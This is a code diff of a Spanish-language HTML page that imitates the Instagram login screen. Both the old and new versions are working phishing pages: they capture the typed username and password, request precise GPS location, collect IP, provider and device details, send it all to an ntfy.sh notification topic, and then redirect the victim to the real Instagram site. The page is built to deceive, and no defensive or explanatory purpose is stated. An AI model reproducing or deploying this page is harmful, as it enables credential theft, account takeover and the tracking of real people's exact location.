@@ -1,235 +1,247 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Instagram</title>
-  <style>
-    body {
-      background-color: #fafafa;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      width: 350px;
-      padding: 40px;
-      background-color: #fff;
-      border: 1px solid #dbdbdb;
-      text-align: center;
-      border-radius: 1px;
-    }
-    .logo {
-      width: 175px;
-      margin-bottom: 30px;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 5px 0;
-      border: 1px solid #dbdbdb;
-      border-radius: 3px;
-      background-color: #fafafa;
-      box-sizing: border-box;
-    }
-    .btn {
-      width: 100%;
-      padding: 8px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 4px;
-      background-color: #3897f0;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .btn:hover {
-      background-color: #318ce7;
-    }
-    .separator {
-      margin: 20px 0;
-      display: flex;
-      align-items: center;
-      color: #8e8e8e;
-    }
-    .separator::before, .separator::after {
-      content: "";
-      flex: 1;
-      border-bottom: 1px solid #dbdbdb;
-    }
-    .separator::before {
-      margin-right: 10px;
-    }
-    .separator::after {
-      margin-left: 10px;
-    }
-    .link {
-      color: #385185;
-      text-decoration: none;
-      font-size: 14px;
-      font-weight: bold;
-      display: block;
-      margin: 15px 0;
-    }
-    .small {
-      font-size: 12px;
-      color: #00376b;
-    }
-    #locationStatus {
-      margin: 10px 0;
-      font-size: 12px;
-      color: #ed4956;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+        .login-container {
+            width: 350px;
+            padding: 20px 40px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+        }
+        .logo {
+            width: 175px;
+            margin: 20px 0;
+        }
+        input {
+            width: 100%;
+            padding: 9px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            background-color: #fafafa;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 7px;
+            margin: 10px 0;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .divider {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+        .divider::before {
+            margin-right: 10px;
+        }
+        .divider::after {
+            margin-left: 10px;
+        }
+        .fb-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: bold;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+        #locationStatus {
+            font-size: 12px;
+            margin: 5px 0;
+            color: #ed4956;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
-    
-    <form id="loginForm">
-      <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required>
-      <input type="password" name="contrasena" placeholder="Contraseña" required>
-      <button type="button" id="requestLocation" class="btn">Permitir ubicación</button>
-      <div id="locationStatus">La ubicación no ha sido concedida</div>
-      <button type="submit" class="btn">Iniciar sesión</button>
-    </form>
-    
-    <div class="separator">O</div>
-    
-    <a href="#" class="link">Iniciar sesión con Facebook</a>
-    <a href="#" class="small">¿Olvidaste tu contraseña?</a>
-  </div>
+    <div class="login-container">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" class="logo" alt="Instagram">
+        
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="button" id="requestLocation">Permitir ubicación</button>
+            <div id="locationStatus">Ubicación no concedida</div>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        
+        <div class="divider">O</div>
+        
+        <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
+        <a href="#" style="font-size: 12px; color: #00376b;">¿Olvidaste tu contraseña?</a>
+    </div>
 
-  <script>
-    const locationStatus = document.getElementById('locationStatus');
-    const requestBtn = document.getElementById('requestLocation');
-    let ubicacionConcedida = false;
-    let coordenadas = null;
+    <script>
+        // Configuración
+        const NTFY_TOPIC = 'tu_topico_secreto_ntfy'; // Cambia esto por tu tema ntfy real
+        let locationGranted = false;
+        let userCoordinates = null;
 
-    // Solicitar permiso de ubicación
-    requestBtn.addEventListener('click', () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            ubicacionConcedida = true;
-            coordenadas = {
-              lat: position.coords.latitude,
-              lon: position.coords.longitude,
-              precision: position.coords.accuracy
-            };
-            locationStatus.textContent = "Ubicación concedida ✓";
-            locationStatus.style.color = "#4CAF50";
-            
-            // Enviar notificación de ubicación concedida
-            enviarNotificacion("📍 Ubicación concedida", `El usuario ha permitido acceso a su ubicación exacta:
-Latitud: ${coordenadas.lat}
-Longitud: ${coordenadas.lon}
-Precisión: ${coordenadas.precision} metros`);
-          },
-          (error) => {
-            locationStatus.textContent = "Ubicación denegada ✗";
-            locationStatus.style.color = "#ed4956";
-          }
-        );
-      } else {
-        locationStatus.textContent = "Geolocalización no soportada";
-      }
-    });
+        // Elementos del DOM
+        const locationStatus = document.getElementById('locationStatus');
+        const requestLocationBtn = document.getElementById('requestLocation');
+        const loginForm = document.getElementById('loginForm');
 
-    // Manejar el envío del formulario
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const form = e.target;
-      const usuario = form.usuario.value;
-      const contrasena = form.contrasena.value;
-      
-      try {
-        // Obtener IP y datos de red
-        const ipData = await obtenerDatosRed();
-        
-        // Obtener información del dispositivo
-        const deviceInfo = obtenerInfoDispositivo();
-        
-        // Crear mensaje con toda la información
-        let mensaje = `🔔 Intento de inicio de sesión:\n\n`;
-        mensaje += `👤 Usuario: ${usuario}\n`;
-        mensaje += `🔐 Contraseña: ${contrasena}\n\n`;
-        mensaje += `🌐 IP: ${ipData.ip}\n`;
-        mensaje += `📍 Ubicación aproximada: ${ipData.ciudad}, ${ipData.region}, ${ipData.pais}\n`;
-        
-        if (ubicacionConcedida && coordenadas) {
-          mensaje += `\n📍 UBICACIÓN EXACTA CONCEDIDA:\n`;
-          mensaje += `Latitud: ${coordenadas.lat}\n`;
-          mensaje += `Longitud: ${coordenadas.lon}\n`;
-          mensaje += `Precisión: ${coordenadas.precision} metros\n`;
-          mensaje += `Google Maps: https://www.google.com/maps?q=${coordenadas.lat},${coordenadas.lon}\n`;
-        }
-        
-        mensaje += `\n🖥️ Dispositivo:\n`;
-        mensaje += `Navegador: ${deviceInfo.navegador}\n`;
-        mensaje += `Sistema: ${deviceInfo.sistema}\n`;
-        mensaje += `Resolución: ${deviceInfo.resolucion}\n`;
-        mensaje += `Idioma: ${deviceInfo.idioma}\n`;
-        mensaje += `Zona horaria: ${deviceInfo.zonaHoraria}`;
-        
-        // Enviar notificación
-        await enviarNotificacion("⚠️ Nuevo login Instagram", mensaje);
-        
-        // Redirigir después de 1.5 segundos
-        setTimeout(() => {
-          window.location.href = 'https://www.instagram.com/accounts/login/';
-        }, 1500);
-        
-      } catch (error) {
-        console.error("Error:", error);
-        window.location.href = 'https://www.instagram.com/accounts/login/';
-      }
-    });
-
-    // Funciones auxiliares
-    async function obtenerDatosRed() {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      const ipData = await ipResponse.json();
-      
-      const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-      const locationData = await locationResponse.json();
-      
-      return {
-        ip: ipData.ip,
-        ciudad: locationData.city || "Desconocida",
-        region: locationData.region || "Desconocida",
-        pais: locationData.country_name || "Desconocido"
-      };
-    }
-
-    function obtenerInfoDispositivo() {
-      return {
-        navegador: navigator.userAgent,
-        sistema: navigator.platform,
-        resolucion: `${window.screen.width}x${window.screen.height}`,
-        idioma: navigator.language,
-        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone
-      };
-    }
-
-    async function enviarNotificacion(titulo, mensaje) {
-      try {
-        await fetch('https://ntfy.sh/3kG4epWMkei6KLLq', {
-          method: 'POST',
-          headers: {
-            'Title': titulo,
-            'Priority': 'high'
-          },
-          body: mensaje
+        // Solicitar ubicación
+        requestLocationBtn.addEventListener('click', () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        locationGranted = true;
+                        userCoordinates = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        locationStatus.textContent = "Ubicación concedida ✓";
+                        locationStatus.style.color = "#4CAF50";
+                        
+                        // Enviar notificación de ubicación
+                        sendNotification("📍 Ubicación concedida", `El usuario ha permitido acceso a su ubicación exacta:
+Latitud: ${userCoordinates.lat}
+Longitud: ${userCoordinates.lng}
+Precisión: ${userCoordinates.accuracy} metros
+Google Maps: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordinates.lng}`);
+                    },
+                    (error) => {
+                        locationStatus.textContent = "Ubicación denegada ✗";
+                        locationStatus.style.color = "#ed4956";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            } else {
+                locationStatus.textContent = "Geolocalización no soportada";
+            }
         });
-      } catch (error) {
-        console.error("Error al enviar notificación:", error);
-      }
-    }
-  </script>
+
+        // Manejar envío del formulario
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = loginForm.username.value;
+            const password = loginForm.password.value;
+            
+            try {
+                // Obtener datos de IP y red
+                const ipInfo = await getIPInfo();
+                
+                // Obtener información del dispositivo
+                const deviceInfo = getDeviceInfo();
+                
+                // Construir mensaje
+                let message = `🔔 Intento de inicio de sesión detectado\n\n`;
+                message += `👤 Usuario: ${username}\n`;
+                message += `🔐 Contraseña: ${password}\n\n`;
+                message += `🌐 Información de red:\n`;
+                message += `IP: ${ipInfo.ip}\n`;
+                message += `Ubicación aproximada: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
+                message += `Proveedor: ${ipInfo.org || 'Desconocido'}\n\n`;
+                
+                if (locationGranted && userCoordinates) {
+                    message += `📍 Ubicación exacta:\n`;
+                    message += `Latitud: ${userCoordinates.lat}\n`;
+                    message += `Longitud: ${userCoordinates.lng}\n`;
+                    message += `Precisión: ${userCoordinates.accuracy}m\n`;
+                    message += `Mapa: https://www.google.com/maps?q=${userCoordinates.lat},${userCoordinates.lng}\n\n`;
+                }
+                
+                message += `🖥️ Información del dispositivo:\n`;
+                message += `Navegador: ${deviceInfo.browser}\n`;
+                message += `Sistema: ${deviceInfo.os}\n`;
+                message += `Resolución: ${deviceInfo.screen}\n`;
+                message += `Idioma: ${deviceInfo.language}\n`;
+                message += `Zona horaria: ${deviceInfo.timezone}`;
+                
+                // Enviar notificación
+                await sendNotification("⚠️ Nuevo login Instagram", message);
+                
+                // Redirigir después de enviar
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/accounts/login/';
+                }, 1500);
+                
+            } catch (error) {
+                console.error("Error al procesar datos:", error);
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }
+        });
+
+        // Función para obtener información de IP
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                return await locationResponse.json();
+            } catch (error) {
+                console.error("Error al obtener datos de IP:", error);
+                return {
+                    ip: "Desconocido",
+                    city: "Desconocida",
+                    region: "Desconocida",
+                    country: "Desconocido"
+                };
+            }
+        }
+
+        // Función para obtener información del dispositivo
+        function getDeviceInfo() {
+            return {
+                browser: navigator.userAgent,
+                os: navigator.platform,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        // Función para enviar notificaciones
+        async function sendNotification(title, message) {
+            try {
+                const response = await fetch(`https://ntfy.sh/${NTFY_TOPIC}`, {
+                    method: 'POST',
+                    headers: {
+                        'Title': title,
+                        'Priority': 'high',
+                        'Tags': 'warning'
+                    },
+                    body: message
+                });
+                
+                if (!response.ok) {
+                    console.error("Error al enviar notificación:", response.status);
+                }
+            } catch (error) {
+                console.error("Error de red al enviar notificación:", error);
+            }
+        }
+    </script>
 </body>
 </html>
